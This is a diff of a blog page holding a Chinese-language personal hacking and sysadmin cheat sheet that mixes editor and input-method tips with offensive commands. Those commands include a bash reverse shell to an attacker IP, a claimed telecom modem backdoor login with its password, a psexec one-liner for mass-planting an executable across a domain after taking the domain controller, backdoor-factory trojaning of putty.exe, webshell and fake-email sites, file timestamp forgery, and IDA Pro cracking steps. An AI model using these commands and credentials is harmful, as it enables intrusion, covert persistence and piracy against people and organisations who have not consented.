@@ -117,7 +117,7 @@
 
       <div class="read-time">
         <small>
-          20 minute read
+          21 minute read
         </small>
       </div>
 
@@ -134,13 +134,14 @@
 <span class="p">3.</span>serve U运行cmd:
     quote site exec "..."
 <span class="p">4.</span>账号telecomadmin密码nE7jA%5m电信猫后门
-<span class="p">5.</span>linux local_root提权  http: // exploit.linuxnote.org/
+<span class="p">5.</span>linux local_root提权  http://exploit.linuxnote.org/
                         https://itunsecurity.wordpress.com/2015/08/16/vulnhub-com-writeup-darknet/(LinEnum.sh,linuxprivchecker.py,unix-privesc-check)
                         https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/?redirect
   windows　https://github.com/GDSSecurity/Windows-Exploit-Suggester
 <span class="p">6.</span>metasploit与postgresql数据库连接:msf &gt; db_connect msf3: AtZDNVQF3NJEyNqU9u1ciHcqTsbcZzKR@127.0.0.1: 5432 / msf3
 <span class="p">7.</span>http: // tool.chacuo.net / mailanonymous   伪造邮件发送,一小时邮箱
-<span class="p">8.</span>bash - i &gt; &amp; / dev / tcp / IP / PORT 0 &gt; &amp;1    bash反弹
+<span class="p">8.</span>bash反弹:
+    /bin/bash -i &gt; /dev/tcp/<span class="nt">&lt;attacker</span><span class="na">_ip</span><span class="nt">&gt;</span>/<span class="nt">&lt;port&gt;</span> 0<span class="err">&lt;&amp;</span>1 2&gt;&amp;1
 <span class="p">9.</span>sed - i '/Love/d' 1.txt   删除包含Love的行
 <span class="p">10.</span>加了vpn就相当于vpn强制给通信链路加了个限制:所有数据只能通过vpn进出.(正常联网的功能只是给系统加了连接其他地址的各种道路,必须先保证可以联网,然后可以保证加了vpn后的效果会是这样&gt;&gt;
     先通过一些数据链路连接到vpn,然后vpn作为代理再访问互联网.
@@ -155,7 +156,7 @@
     修改密码
     SET PASSWORD FOR 'username'@'host' = PASSWORD('newpassword');
     修改权限
-    GRANT privileges ON databasename.tablename TO 'username'@'host' WITH GRANT OPTION；(databasename.tablename可为<span class="ge">*.*</span>,privileges可为all,注意databasename和tablename中不要有'.'这个标点,否则databasename.tablename不知道在哪儿算作分开,eg.gv32_cms5.1.9是数据库名,则会出错)
+    GRANT privileges ON databasename.tablename TO 'username'@'host' WITH GRANT OPTION;(databasename.tablename可为<span class="ge">*.*</span>,privileges可为all,注意databasename和tablename中不要有'.'这个标点,否则databasename.tablename不知道在哪儿算作分开,eg.gv32_cms5.1.9是数据库名,则会出错)
 <span class="p">14.</span>ip:23.23.23.23    (bing)
 <span class="p">15.</span>暴路径http://www.lxway.com/1191778.html  
 <span class="p">16.</span>sublime text快捷键好东西:http://www.cnblogs.com/lanxuezaipiao/p/4151095.html
@@ -163,7 +164,10 @@
 <span class="p">17.</span>nmap :
   nmap -v -sP -PI -PT -Pn 192.168.0.0/24
   nmap -v -sn -PE 192.168.0.0/24 快速扫描局域网存活主机
-<span class="p">18.</span>head -n 1 /etc/issue   # 查看linux操作系统版本
+<span class="p">18.</span>常用linux命令
+
+   head -n 1 /etc/issue   # 查看linux操作系统版本
+   getconf LONG_BIT       # 查看系统是32位还是64位
    网络
    
    # ifconfig               # 查看所有网络接口的属性
@@ -203,6 +207,7 @@
 <span class="p">21.</span>神器lfi自动探测panoptic:https://github.com/lightos/Panoptic
    神器load_file自动探测sqlnuke:https://github.com/nuke99/sqlnuke.git
 <span class="p">22.</span>webshell:
+  webshell generate site(good):http://www.zjjv.com/
   good:https://r57.gen.tr/
        http://www.dcvi.net/
   http://www.passwaf.com/
@@ -372,7 +377,7 @@
 <span class="p">36.</span>mouse without borders:多屏幕同键盘鼠标控制
               https://www.microsoft.com/en-us/download/confirmation.aspx?id=35460(win)
               http://alternativeto.net/software/mouse-without-borders2/?platform=linux(linux)
-              x2vnc(目前认为最好,通过vnc达到mouse without borders的功能！！)
+              x2vnc(目前认为最好,通过vnc达到mouse without borders的功能!!)
 <span class="p">37.</span>java执行jar文件命令:java -jar xx.jar
 <span class="p">38.</span>.htaccess can be :
   1&gt;
@@ -425,7 +430,7 @@
 
 </span>   windows:
    find /r 目录名 %变量名 in (匹配模式1,匹配模式2) do 命令  eg:echo "yes" | for /r f:<span class="se">\ </span>%i in (<span class="ge">*.doc,*</span>.docx,<span class="ge">*.pdf,*</span>.xls,<span class="ge">*.xlsx,*</span>.txt) do copy "%i" f:<span class="se">\w</span>eb_r
-   E:<span class="se">\R</span>ECYCLER<span class="se">\R</span>ar.exe a -k -r -s -m1 E:<span class="se">\w</span>wwroot<span class="se">\W</span>eb<span class="se">\w</span>eb.rar E:<span class="se">\w</span>wwroot<span class="se">\W</span>eb<span class="err">\</span>
+   c:<span class="se">\r</span>ecycler<span class="se">\r</span>ar.exe a -k -r -s -m1 c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\t</span>mp.rar c:<span class="se">\r</span>ecycler<span class="se">\t</span>mp<span class="se">\*</span>.<span class="err">*</span>
    7z.exe a -t7z -p123456 c:<span class="se">\t</span>est.7z c:<span class="se">\t</span>est<span class="se">\*</span>.<span class="err">*</span>
    del /f/q folder
    rar a /v20m /m0 newfilename web.rar
@@ -671,6 +676,11 @@
 <span class="p">59.</span>dig mx domain(without www)
 <span class="p">60.</span>pwntool:https://www.91ri.org/14382.html
 <span class="p">61.</span>vim以十六进制编辑文件:%!xxd
+       :%!xxd    ---&gt;   :%!xxd -r    ---&gt;    :wq
+       如果失败则用hexedit编辑
+           ctrl+X:save and exit
+   vim对比两个文件:vim -d 1.txt 2.txt
+   vim自动保存有用版本答案(相当于esc/jk实现保存功能):au InsertLeave <span class="err">*</span> write
 <span class="p">62.</span>sublime插件:
     python pep8 autoformat(python代码自动对齐)ctrl+shift+r
     JsFormat(javascript代码自动对齐)ctrl+alt+f
@@ -779,8 +789,21 @@
                            然后添加:
                            map <span class="nt">&lt;F5&gt;</span> :call CheckPythonSyntax()<span class="nt">&lt;CR&gt;</span>
                          2&gt;在vimrc文件中加nnoremap <span class="nt">&lt;buffer&gt;</span> <span class="nt">&lt;F9&gt;</span> :exec '!python' shellescape(@%, 1)<span class="nt">&lt;cr&gt;</span>(1更好)
-    vim进阶:http://coolshell.cn/articles/5426.html
-<span class="p">75.</span>1&gt;dmz+光猫+有线路由+无线路由下的端口映射:
+    vim进阶:http://coolshell.cn/articles/5426.html<span class="sb">
+
+    my tmux配置:
+        https://github.com/tmux/tmux     安装最新版本
+        https://github.com/gpakosz/.tmux 安装比较好的配置
+        echo $EDITOR
+        export EDITOR=vim
+        echo $EDITOR
+        http://blog.csdn.net/g1036583997/article/details/50466499    tmux提制模式
+        http://cenalulu.github.io/linux/tmux/
+
+    ubuntu安装Oh-My-Zsh:
+        https://zhuanlan.zhihu.com/p/19556676
+        http://www.jianshu.com/p/9a5c4cb0452d
+</span><span class="p">75.</span>1&gt;dmz+光猫+有线路由+无线路由下的端口映射:
    2&gt;拓扑图大致为:
           光猫(192.168.1.1)
            ｜
@@ -827,10 +850,13 @@
              https://www.91ri.org/tag/neiwang-hacker
              http://drops.wooyun.org/tips/6617   导出当前域内所有用户hash的技术整理
              http://www.objectif-securite.ch/ophcrack.php   windows hashes crack
+             http://cracer.com/?p=1247  拿下域控后批量种马:psexec.exe @pc.txt -u ABIMAQ<span class="se">\A</span>dministrator -p k78m90 -c c:<span class="se">\k</span>av<span class="se">\2</span>009.exe
+             http://drops.wooyun.org/tips/12021   拿下域控权限
    快速找出dc:
             dsquery server(best)
             nslookup -type=SRV _ldap._tcp.baidu.com
             netdom query fsmo
+            net group "domain controllers" /domain
 <span class="p">88.</span>ipc$:http://www.cnblogs.com/lhws/p/4024208.htm
 <span class="p">89.</span>github pages+jekyll搭建个人博客:
         https://www.zhihu.com/question/20223939
@@ -857,9 +883,13 @@
 <span class="p">92.</span>kali2安装rime输入法:https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
                        https://wu.nerd.moe/?p=1752
                        /usr/bin/rime_dict_manager自带词库管理工具
+                            kali_local:/root/.config/fcitx/rime/wubi86.userdb.kct
+                            windows:%appdata%<span class="se">\r</span>ime<span class="se">\w</span>ubi86.userdb.kct
                        http://www.jianshu.com/p/cffc0ea094a7
                        https://github.com/rime/home/wiki/CustomizationGuide
-                       重新部署使配置生效:---&gt;    rm ~/.config/ibus/rime/default.yaml; ibus-daemon -drx
+                       重新部署使配置生效:---&gt;    rm ~/.config/ibus/rime/default.yaml; ibus-daemon -drx<span class="sb">
+
+                       pidof fcitx | xargs kill;pidof sogou-qimpanel | xargs kill;nohup fcitx  1&gt;/dev/null 2&gt;/dev/null &amp;;nohup sogou-qimpanel  1&gt;/dev/null 2&gt;/dev/null &amp;
                        emoji对应表:https://rimeime.googlecode.com/svn/trunk/artworks/schema/emoji-chart.png
                        新建default.custom.yaml,内容为patch:...,意思是要覆盖default.yaml中配置,其它如wubi_pinyin.yaml等对应wubi_pinyin.custom.yaml
                        eg.my default.custom.yaml file:
@@ -867,12 +897,12 @@
                             patch:
                                 menu/page_size: 9
                                 schema_list:
-<span class="p">                                  -</span> schema: luna_pinyin
-<span class="p">                                  -</span> schema: luna_pinyin_fluency
-<span class="p">                                  -</span> schema: luna_pinyin_simp
-<span class="p">                                  -</span> schema: wubi_pinyin
-<span class="p">                                  -</span> schema: wubi86
-<span class="p">                                  -</span> schema: emoji
+                                  - schema: luna_pinyin
+                                  - schema: luna_pinyin_fluency
+                                  - schema: luna_pinyin_simp
+                                  - schema: wubi_pinyin
+                                  - schema: wubi86
+                                  - schema: emoji
                                 ascii_composer:
                                   good_old_caps_lock: true
                                   switch_key:
@@ -883,8 +913,12 @@
                                     Shift_L: commit_code
                                     Shift_R: inline_ascii
                       --------------------end----------------------------
-    windows中rime词库文件位置:%APPDATA%<span class="se">\r</span>ime
-<span class="p">93.</span>windows download:https://www.microsoft.com/en-us/search/result.aspx?q=windows+xp+professional+x64+edition&amp;form=MSHOME
+    windows中rime词库文件位置:%APPDATA%\rime
+    深蓝词库转换工具:
+                    https://github.com/studyzy/imewlconverter
+                    http://www.cnblogs.com/studyzy/archive/2013/01/10/2855403.html
+
+</span><span class="p">93.</span>windows download:https://www.microsoft.com/en-us/search/result.aspx?q=windows+xp+professional+x64+edition&amp;form=MSHOME
 <span class="p">94.</span>backdoor-factory用法:
 <span class="p">    1.</span>单独的backdoor-factory:backdoor-factory -f /root/Desktop/putty.exe -S (check if the putty.exe is support for backdoor-factory)
                              backdoor-factory -f /root/Desktop/putty.exe -s show (show usable kinds of reverse shell supported)
@@ -905,7 +939,7 @@
 <span class="p">97.</span>windows中ping google &amp;&amp; ping baidu ==&gt;ping.bat:
                                          cmd /k "ping www.google.com.hk &amp;&amp; ping www.baidu.com"
    创建ping.bat文件的快捷方式,在快捷方式中添加快捷键.eg.ctrl+alt+p
-<span class="p">98.</span>linux开启http代理:service squid3 status,service squid3 start,vi /etc/squid3/squid3.conf
+<span class="p">98.</span>linux开启http代理:service squid3 status,service squid3 start,vi /etc/squid3/squid.conf myport:8000
 <span class="p">99.</span>booklist:http://www.jianshu.com/p/67e294106919
 <span class="p">100.</span>gdb:http://www.jianshu.com/p/f20b10ea9a61
 <span class="p">101.</span>study links:
@@ -955,8 +989,71 @@
     同时修改文件的修改时间和访问时间
     touch -d "2010-05-31 08:10:30" test.doc
 <span class="p">106.</span>rime全角到半角解决方法:如果主机突然变成全角而无法变回半角,从任意地方中复制一个正常的半角字符串到主机中任意地方即可,不用重启
-</code></pre>
+<span class="p">107.</span>ssh文件复制:eg.本机未登录前执行
+        scp level08@192.168.2.140:/home/level08/capture.pcap /1.pcap     (remote-&gt;local)
+        scp /tmp.txt level08@192.168.2.140:/home/level08/                (local-&gt;remote)
+<span class="p">108.</span>echo 'ibase=16;410' | bc 
+        16进制的410转换成默认10进制:out-&gt;1040
+    echo 'ibase=16;obase=2;410' | bc
+        16进制的410转换成2进制:out-&gt;10000010000
+<span class="p">109.</span>python中ord和int:
+    int('12')=12
+    int('b')=error(int的参数只能是'num'类型)
+    ord('b')=98
+    ord('a')=97
+    ord('0')=48
+    ord('ascii')=ascii这一个字符对应的十进制整数(ascii只能是a character,not string)
+<span class="p">110.</span>书单
+        http://www.heysec.org/archives/257
+        https://www.zhihu.com/question/24152689
+        http://m.blog.csdn.net/article/details?id=45482849
+<span class="p">111.</span>linux上ssh无法以root用户登录解决方法:
+    vi /etc/ssh/sshd_config (attention!,here is not /etc/ssh/ssh_config)
+    /PermitRootLogin<span class="nt">&lt;Enter&gt;</span>
+    change to:
+        PermitRootLogin yes
+<span class="p">112.</span>gcc编译so文件:
+        gcc -shared -fPIC myfile.c -o myfile.socc
+<span class="p">113.</span>wordpress 渗透工具
+<span class="p">    1.</span>wpscan
+<span class="p">    2.</span>http://www.getwpxf.com/  seems better
+<span class="p">114.</span>linux中c代码中多个参数代码编写参考规范:http://blackndoor.com/nebula-level18/
+<span class="p">115.</span>一个十六进制位是4bits,0x12345678是32bits,相当于一个32位系统下的栈单元
+    一个汉字是2个字符4个字节32位,4 bytes,32 bits
+    一个DWORD则是4个字符8个字节64位,8 bytes,64 bits
+<span class="p">116.</span>linux安装程序
+    cd program
+    ./configure
+    make
+    sudo make install
+<span class="p">117.</span>linux提权时,编译exploit.c文件时必须在对方系统中编译,或者与对方系统一样的系统中编译,否则本地编译出exploit文件后上传到对方机器运行时会出现can not execute binary file的错误
+<span class="p">118.</span>访问目录时,404不代表文件夹一定不存在,尤其是那些不标准显示的404,有可能是webapp或waf故意这样显示的,但是404显示目录下的文件还是可以正常访问的
+<span class="p">119.</span>c_++头:
+        using namespace std;
+        #include <span class="nt">&lt;iostream&gt;</span>
+<span class="p">120.</span>ida破解,替换ida pro根目录下的ida.key为https://gist.github.com/TheCjw/9f6f7544f33f292db20e下的key文件,然后将系统时间改成1年以前下的key文件,然后将系统时间改成1年以前
+<span class="p">121.</span>ROP就是所谓的Return Orientated Programming,早期也叫ret2libc.
+<span class="p">122.</span>html中的图标    http://fontawesome.io/icons/
+<span class="p">123.</span>fckeditor设置:http://www.jb51.net/article/17965.htm
+<span class="p">124.</span>html转pdf:
+    wkhtmltopdf www.myhomepage.com myhomepage.pdf
+    在线pdf编辑 http://www.pdfescape.com/
+    本地pdf快速转换:chrome浏览器(全选或部分选择后)右键可打印成pdf
+<span class="p">125.</span>printf("%x"):第一个栈里的值
+    printf("%3x"):第一个栈里的值,用3个字节长度表示
+    printf("%3<span class="se">\$</span>x"):第三个栈里的值(这一条适用于绝大多数的<span class="err">*</span>nix的系统,win下不支持则用printf("%x,%x,%x")来达到同样的目的)
+    宽度格式符(%3)中的%和3是不分开的,如果%3后面加了<span class="se">\$</span>(直接参数访问)则表示为打印第3个栈里的值
+<span class="p">126.</span>visual studio快速编译一个c文件
+    运行C:<span class="se">\P</span>rogram Files (x86)<span class="se">\M</span>icrosoft Visual Studio 14.0<span class="se">\C</span>ommon7<span class="se">\T</span>ools<span class="se">\V</span>sDevCmd.bat
+    然后运行cl md.c
+    或者打开tools里面的开发人员提示符,然后再cl md.c<span class="sb">
+
+
+
+
+</span></code></pre>
 </div>
+
 </span>
 
         
